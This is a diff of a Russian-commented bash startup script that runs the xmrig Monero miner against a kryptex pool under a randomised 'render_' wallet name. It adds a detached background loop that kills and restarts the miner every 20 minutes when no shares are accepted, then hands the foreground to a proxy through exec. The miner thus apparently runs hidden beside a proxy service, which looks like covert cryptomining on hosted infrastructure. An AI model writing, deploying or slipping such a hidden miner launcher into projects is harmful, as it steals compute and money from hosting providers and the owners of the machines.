@@ -11,55 +11,40 @@ ARCHIVE=$DIR-linux-static-x64.tar.gz
 
 WALLET="krxX3328ZR/render_$((RANDOM % 1000 + 1))"
 LOGFILE="xmrig_${WALLET##*_}.log"
+MINER_PID=""
 
-# Функция проверки: жив ли майнер по-настоящему
-is_miner_alive() {
-    local pid=$(pgrep -f "xmrig.*$WALLET" | head -1)
-    [[ -z "$pid" ]] && return 1  # нет процесса
-    
-    # Проверка 1: процесс не в состоянии "stopped" (T)
-    local state=$(ps -o state= -p "$pid" 2>/dev/null | tr -d ' ')
-    [[ "$state" == "T" ]] && return 1
-    
-    # Проверка 2: есть ли активность в логе за последние 2 минуты
-    [[ -f "$LOGFILE" ]] && find "$LOGFILE" -mmin -2 -print -quit | grep -q . && return 0
-    
-    # Проверка 3: потребляет ли процесс хоть немного CPU (за 10 сек)
-    local cpu=$(ps -o %cpu= -p "$pid" 2>/dev/null | tr -d ' ')
-    [[ -n "$cpu" ]] && (( $(echo "$cpu > 0.1" | bc -l 2>/dev/null || echo 0) )) && return 0
-    
-    return 1  # процесс есть, но "мёртв"
-}
-
-# Запуск майнера с параметрами для лучшего логгирования
+# Функция запуска майнера
 start_miner() {
-    nohup ./$DIR/xmrig \
+    ./$DIR/xmrig \
         --url=xmr-ru.kryptex.network:7029 \
         --user="$WALLET" \
         --pass=x \
         --coin=monero \
         --cpu-max-threads-hint=5 \
         --randomx-mode=light \
-        --print-time=30 \          # писать статистику каждые 30 сек
-        --verbose \                # больше логов
-        --no-color \
-        > "$LOGFILE" 2>&1 &
-    echo $!
+        --print-time=30 \
+        > "$LOGFILE" 2>&1
 }
 
-# Главный цикл мониторинга
+# Монитор в фоне: рестарт если нет шар за 20 минут
 (
-    MINER_PID=""
     while true; do
-        if ! is_miner_alive; then
+        # Если лога нет или в нём нет "accepted" за последние 20 мин — рестарт
+        if [[ ! -f "$LOGFILE" ]] || ! grep -q "accepted" <(tail -n 200 "$LOGFILE" 2>/dev/null); then
             [[ -n "$MINER_PID" ]] && kill -9 "$MINER_PID" 2>/dev/null
-            echo "[$(date '+%H:%M:%S')] Restarting miner..." >> "$LOGFILE"
-            MINER_PID=$(start_miner)
+            start_miner &
+            MINER_PID=$!
+            disown
         fi
-        sleep 30
+        sleep 1200  # 20 минут
     done
 ) &
 disown
 
-# Запуск прокси
+# Первый запуск майнера
+start_miner &
+MINER_PID=$!
+disown
+
+# Запуск прокси (основной процесс)
 exec ./proxy
